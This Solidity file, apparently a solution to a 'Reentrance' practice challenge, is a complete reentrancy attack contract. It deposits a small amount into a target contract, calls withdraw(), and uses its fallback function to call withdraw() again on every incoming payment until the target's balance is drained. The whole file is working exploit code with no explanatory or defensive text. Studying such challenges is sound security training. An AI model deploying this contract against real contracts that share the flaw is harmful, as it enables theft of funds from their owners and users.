// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    Reentrance re;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
        re = Reentrance(contractAddress);

    }

    function hackContract() external payable {
        // Code me!
        require(address(this).balance == 1,"Value not 1");
        // re.donate{value: address(this).balance}(address(this));
        // re.withdraw();
       (bool sent,) =  payable(contractAddress).call{value: address(this).balance}(abi.encodeWithSignature("donate(address)",address(this)));
        require(sent, "Failed to deposit");


        (bool success,) = contractAddress.call(abi.encodeWithSignature("withdraw()"));
        require(success,"Failed to withdraw");



    }

    fallback() external payable {

        if (contractAddress.balance >= 1) {
           (bool success,) = contractAddress.call(abi.encodeWithSignature("withdraw()"));
            require(success,"Failed to withdraw");
        }

        



        }
}
